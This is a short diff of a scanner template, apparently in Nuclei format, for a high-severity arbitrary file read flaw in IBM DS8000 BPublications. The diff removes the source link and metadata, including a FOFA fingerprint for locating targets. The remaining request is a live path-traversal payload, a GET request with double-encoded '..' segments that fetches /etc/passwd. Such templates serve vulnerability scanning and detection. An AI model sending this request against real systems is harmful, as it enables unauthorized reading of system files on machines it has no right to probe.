@@ -3,12 +3,8 @@ info:
   name: IBM DS8000 BPublications存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mcxq30uq691xzzri'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mcxq30uq691xzzri
-    fofa: body="/preloginmonitor/welcome.jsp"
 http:
 - raw:
   - GET /help/topic/BPublications/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd HTTP/1.1
